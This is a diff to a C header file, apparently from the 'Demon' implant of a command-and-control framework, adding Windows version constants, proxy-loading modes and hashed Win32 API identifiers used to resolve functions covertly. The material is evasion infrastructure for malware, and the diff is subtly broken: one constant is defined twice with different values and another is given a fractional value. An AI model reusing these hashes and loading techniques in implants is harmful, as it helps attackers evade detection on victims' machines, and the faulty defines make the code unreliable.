@@ -12,6 +12,27 @@
 #define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
 #endif
 
+#define DEMON_MAGIC_VALUE 0xDEADBEEF
+
+#define WIN_VERSION_UNKNOWN 0
+#define WIN_VERSION_XP      1
+#define WIN_VERSION_VISTA   2
+#define WIN_VERSION_2008    3
+#define WIN_VERSION_7       4
+#define WIN_VERSION_2008_R2 5
+#define WIN_VERSION_2008_R2 6
+#define WIN_VERSION_2012    7
+#define WIN_VERSION_8       8
+#define WIN_VERSION_8_1     8.1
+#define WIN_VERSION_2012_R2 9
+#define WIN_VERSION_10      10
+#define WIN_VERSION_2016_X  11
+
+#define PROXYLOAD_NONE             0
+#define PROXYLOAD_RTLREGISTERWAIT  1
+#define PROXYLOAD_RTLCREATETIMER   2
+#define PROXYLOAD_RTLQUEUEWORKITEM 3
+
 /* Win32 Functions */
 #define H_FUNC_LDRLOADDLL                        0x9e456a43
 #define H_FUNC_LDRGETPROCEDUREADDRESS            0xfce76bb6
@@ -67,6 +88,7 @@
 #define H_FUNC_RTLCREATETIMERQUEUE               0x50ef3c31
 #define H_FUNC_RTLDELETETIMERQUEUE               0xeec188b0
 #define H_FUNC_RTLCREATETIMER                    0x1877faec
+#define H_FUNC_RTLQUEUEWORKITEM                  0xae92028e
 #define H_FUNC_RTLREGISTERWAIT                   0x600fe691
 #define H_FUNC_RTLCAPTURECONTEXT                 0xeba8d910
 #define H_FUNC_RTLCOPYMAPPEDMEMORY               0x5b56b302
@@ -75,6 +97,7 @@
 #define H_FUNC_RTLSUBAUTHORITYSID                0x90ed208a
 #define H_FUNC_RTLSUBAUTHORITYCOUNTSID           0x4b23c9d3
 
+#define H_FUNC_LOADLIBRARYW                      0xb7072ff1
 #define H_FUNC_GETTICKCOUNT                      0xa28ae999
 #define H_FUNC_GETCOMPUTERNAMEEXA                0xec725c53
 #define H_FUNC_WAITFORSINGLEOBJECTEX             0x512e1b97
